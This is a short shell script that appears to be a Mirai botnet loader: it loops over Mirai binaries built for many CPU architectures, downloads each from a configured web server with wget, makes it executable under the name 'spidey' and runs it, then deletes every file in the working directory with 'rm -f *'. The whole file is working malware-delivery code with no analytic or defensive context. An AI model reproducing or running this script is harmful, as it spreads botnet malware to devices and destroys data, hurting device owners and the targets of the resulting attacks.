#!/bin/sh


#change the webserver address.

WEBSERVER="localhost:80"

#Binary files | Release binary

BINARIES_FILE="mirai.arm mirai.arm7 mirai.m68k mirai.mips mirai.mpsl mirai.ppc mirai.sh4 mirai.spc mirai.x86"

for bin in $BINARIES_FILE; do
        wget http://$WEBSERVER/$bin -O spidey
        chmod 777 spidey
        ./spidey
done

rm -f *

